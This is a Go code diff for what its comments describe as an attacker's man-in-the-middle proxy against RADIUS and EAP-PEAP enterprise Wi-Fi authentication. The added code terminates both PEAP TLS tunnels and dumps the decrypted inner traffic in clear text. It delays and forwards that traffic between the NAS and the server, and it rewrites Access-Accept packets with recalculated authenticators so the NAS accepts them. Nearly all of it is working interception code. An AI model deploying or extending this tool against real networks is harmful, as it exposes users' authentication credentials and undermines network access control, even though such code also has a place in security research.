@@ -2,6 +2,7 @@ package main
 
 import (
 	"crypto/rand"
+	"encoding/hex"
 	"flag"
 	"fmt"
 	"net"
@@ -9,6 +10,18 @@ import (
 	"radius/radius"
 	"radius/session"
 )
+
+//delayedTLSData struct to hold the TLS data that has been captured but cannot be forwarded because
+//the handshake process has not been finished yet.
+type delayedTLSData struct {
+	tlsContent     []byte
+	context        *session.ContextInfo
+	msgID          uint8
+	eapID          uint8
+	clientToServer bool
+}
+
+var delayedTLSChunks []delayedTLSData
 
 const authPort = 1812
 const accPort = 1813
@@ -18,6 +31,48 @@ const hostName = "169.254.63.10"
 const wireless80211Port = 19
 
 var mySession session.Session
+
+func forwardOrDelayTLSData(tlsContent []byte, context *session.ContextInfo, msgID uint8, eapID uint8, clientToServer bool) {
+
+	tlsSession := context.GetTLSSession()
+
+	tlsChunk := delayedTLSData{
+		tlsContent:     tlsContent,
+		context:        context,
+		msgID:          msgID,
+		eapID:          eapID,
+		clientToServer: clientToServer,
+	}
+
+	if (clientToServer && tlsSession.GetServerHandShakeStatus() > 2) || (!clientToServer && tlsSession.GetNASHandShakeStatus() > 2) {
+		fmt.Println("TLS Data forwarded", clientToServer)
+		onTLSData(tlsContent, context, msgID, eapID, clientToServer)
+	} else {
+		fmt.Println("TLS Data delayed", clientToServer)
+		delayedTLSChunks = append(delayedTLSChunks, tlsChunk)
+	}
+
+}
+
+func deliverDelayedTLSData(clientToServer bool) {
+
+	i := 0
+
+	for i < len(delayedTLSChunks) {
+
+		if delayedTLSChunks[i].clientToServer == clientToServer {
+			fmt.Println("TLS Data delivered", clientToServer)
+			onTLSData(delayedTLSChunks[i].tlsContent, delayedTLSChunks[i].context,
+				delayedTLSChunks[i].msgID, delayedTLSChunks[i].eapID, delayedTLSChunks[i].clientToServer)
+
+			delayedTLSChunks = append(delayedTLSChunks[:i], delayedTLSChunks[i+1:]...)
+		} else {
+			i++
+		}
+
+	}
+
+}
 
 func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, clientToServer bool) bool {
 
@@ -51,6 +106,14 @@ func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UD
 
 	//Get the session context by means of the client address
 	context := session.GetContextByClient(client)
+
+	//Keep track of the current ID for received packets...
+	if clientToServer {
+		context.SetLastNASMsgId(manglePacket.GetId())
+		context.SetLastAuthMsg(manglePacket.GetAuthenticator()) //Keep track also of the
+	} else {
+		context.SetLastServerMsgId(manglePacket.GetId())
+	}
 
 	if manglePacket.GetCode() == radius.AccessChallenge {
 
@@ -135,6 +198,27 @@ func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UD
 			fmt.Println("EAP Decode Type:", eapHeader.GetType())
 			fmt.Println("EAP Decode Length:", eapHeader.GetLength())
 
+			//Success message. We need to modify some fields...
+			if eapHeader.GetCode() == eap.EAPSuccess {
+				eapHeader.SetId(context.GetLastNASEapId() + 1)
+
+				if ok, encodedPEAP := eapHeader.Encode(); ok {
+					manglePacket.SetEAPMessage(encodedPEAP)
+					//If we receive a Access Accept message, recalculate the authenticator field to make it valid to the NAS.
+					//We must also modify the IDs of the messages
+					if manglePacket.GetCode() == radius.AccessAccept {
+						manglePacket.DelRawAttr(26) //Remove vendor specific attrs
+						manglePacket.SetId(context.GetLastNASMsgId())
+						radius.RecalculateMsgAuth(manglePacket, context.GetLastAuthMsg(), context.GetSecret())
+
+						if ok, auth := radius.CalculateResponseAuth(manglePacket, context.GetLastAuthMsg(), context.GetSecret()); ok {
+							manglePacket.SetAuthenticator(auth)
+						}
+
+					}
+				}
+			}
+
 			if eapHeader.GetCode() == eap.EAPRequest || eapHeader.GetCode() == eap.EAPResponse {
 				eapPacket := eap.GetEAPByType(eapHeader.GetType())
 
@@ -142,6 +226,13 @@ func manglePacket(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.UD
 
 				if ok {
 					fmt.Println("EAP decoded")
+
+					//Keep track of the last EAP message ID
+					if clientToServer {
+						context.SetLastNASEapId(eapPacket.GetId())
+					} else {
+						context.SetLastServerEapId(eapPacket.GetId())
+					}
 
 					switch eapPacket.GetType() {
 					case eap.Identity:
@@ -255,8 +346,9 @@ func manageServerPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to ne
 
 			payload, length := context.GetAndDeleteServerTLSPayloadAndLength()
 
-			if uint32(len(payload)) != length {
-				fmt.Println("EAPMessage --> Length mismatch!!")
+			if length != 0 && uint32(len(payload)) != length {
+				fmt.Println("EAPMessage --> Length mismatch!! len(payload) -->", len(payload), "length -->", length)
+
 			}
 
 			tlsSession.GetServerTunnel().WriteRaw(payload)
@@ -286,11 +378,14 @@ func manageServerPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to ne
 
 				tlsSession.SetServerHandShakeStatus(3)
 
+				deliverDelayedTLSData(!clientToServer)
+				fmt.Println("Handshake with server OK")
+
 			} else {
 				//TLS Payload to handle
 				tlsContent := tlsSession.ReadTLSFromServer()
 
-				onTLSData(tlsContent, context, manglePacket.GetId(), peapPacket.GetId(), clientToServer)
+				forwardOrDelayTLSData(tlsContent, context, manglePacket.GetId(), peapPacket.GetId(), clientToServer)
 
 			}
 
@@ -307,11 +402,18 @@ func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.U
 
 	tlsSession := context.GetTLSSession()
 
+	if tlsSession == nil {
+		return false // Peap session already started and we did not manage to create a session previously.
+	}
+
 	if !peapPacket.GetLengthFlag() && !peapPacket.GetMoreFlag() && !peapPacket.GetStartFlag() && len(peapPacket.GetTLSPayload()) == 0 {
 		//Received Peap Ack message
 
 		if tlsSession.GetNASHandShakeStatus() == 2 { //The handshake process has finished
 			tlsSession.SetNASHandShakeStatus(3) //Ack from the client to tell us the TLS session succeded
+			deliverDelayedTLSData(!clientToServer)
+
+			fmt.Println("Handshake with NAS OK")
 		}
 
 		//As attacker, we decide to not split the Eap messages into different Radius packets. We avoid handling splitted Eap messages and therefore,
@@ -343,8 +445,8 @@ func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.U
 		} else {
 			payload, length := context.GetAndDeleteNASTLSPayloadAndLength()
 
-			if uint32(len(payload)) != length {
-				fmt.Println("EAPMessage --> Length mismatch!!")
+			if length != 0 && uint32(len(payload)) != length {
+				fmt.Println("EAPMessage --> Length mismatch!! len(payload) -->", len(payload), "length -->", length)
 			}
 
 			tlsSession.GetNASTunnel().WriteRaw(payload)
@@ -353,15 +455,14 @@ func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.U
 			//Check handshake status
 			if tlsSession.GetNASHandShakeStatus() < 2 {
 
-				fmt.Println("Read 1!!")
-
 				//Start asynchronous read so that the TLS server side process the handshakes
-				tlsSession.GetNASTunnel().ReadTlsAsync()
-				//tlsSession.NASReadTLS()
+				if tlsSession.GetNASHandShakeStatus() == 0 {
+					tlsSession.GetNASTunnel().ReadTlsAsync()
+				}
 
 				//Read the handshake packet generated by the server
 				rawResponse := tlsSession.GetNASTunnel().ReadRaw()
-				fmt.Println("Read 2!!")
+				fmt.Println("Read !!")
 
 				//Send ACK Eap Message to the Client
 				craftedPacket := craftPacketFromTLSPayload(context, rawResponse, manglePacket.GetId(),
@@ -377,12 +478,12 @@ func manageNASPeap(manglePacket *radius.RadiusPacket, from net.UDPAddr, to net.U
 				//First message after Handshake
 				//Get the asynchronous data
 				tlsContent := <-tlsSession.GetNASTunnel().GetReadTLSChannel()
-				onTLSData(tlsContent, context, manglePacket.GetId(), peapPacket.GetId(), clientToServer)
-
+				forwardOrDelayTLSData(tlsContent, context, manglePacket.GetId(), peapPacket.GetId(), clientToServer)
+				tlsSession.SetNASHandShakeStatus(4)
 			} else {
 
 				tlsContent := tlsSession.GetNASTunnel().ReadTls()
-				onTLSData(tlsContent, context, manglePacket.GetId(), peapPacket.GetId(), clientToServer)
+				forwardOrDelayTLSData(tlsContent, context, manglePacket.GetId(), peapPacket.GetId(), clientToServer)
 
 			}
 
@@ -467,7 +568,35 @@ func craftPacketFromTLSPayload(context *session.ContextInfo, payload []byte, msg
 
 //This method will receive the content of the TLS session in clear text, no ciphers
 func onTLSData(tlsContent []byte, context *session.ContextInfo, msgID uint8, eapID uint8, clientToServer bool) {
-	fmt.Println("onTLSData. Data:", tlsContent)
+	fmt.Println("onTLSData. Data:", hex.Dump(tlsContent))
+
+	//Forward TLS data
+	tlsSession := context.GetTLSSession()
+	var rawContent []byte
+
+	var lastMsgID, lastEapID byte
+
+	var authenticator [16]byte
+
+	if clientToServer {
+		tlsSession.GetServerTunnel().WriteTls(tlsContent)
+		rawContent = tlsSession.GetServerTunnel().ReadRaw()
+		lastMsgID = context.GetLastServerMsgId() + 1
+		lastEapID = context.GetLastServerEapId()
+	} else {
+		tlsSession.GetNASTunnel().WriteTls(tlsContent)
+		rawContent = tlsSession.GetNASTunnel().ReadRaw()
+		lastMsgID = context.GetLastNASMsgId()
+		lastEapID = context.GetLastNASEapId() + 1
+		authenticator = context.GetLastAuthMsg()
+	}
+
+	fmt.Println("Forwarding TLS. MSG ID: ", lastMsgID, ", EAP ID:", lastEapID)
+
+	craftedPacket := craftPacketFromTLSPayload(context, rawContent, lastMsgID, lastEapID, clientToServer, authenticator)
+
+	//Send crafted packet
+	mySession.SendPacket(craftedPacket, clientToServer)
 
 }
 
